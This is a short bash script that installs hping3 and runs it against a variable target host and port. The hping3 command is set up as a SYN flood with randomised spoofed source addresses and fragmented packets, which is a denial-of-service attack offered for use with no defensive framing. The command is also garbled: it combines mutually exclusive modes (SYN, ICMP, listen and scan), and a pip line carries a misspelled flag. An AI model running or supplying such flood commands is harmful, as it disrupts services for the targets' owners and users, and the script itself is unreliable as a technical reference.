#!/bin/bash

apt update && apt upgrade -y
pip install --upgarade pip

sudo apt install hping3 -y

hping3 -S $target_host -p $target_port -c 1000 -i u100 --flood -d 120 -f --icmp --listen --rand-source --scan 1-1000
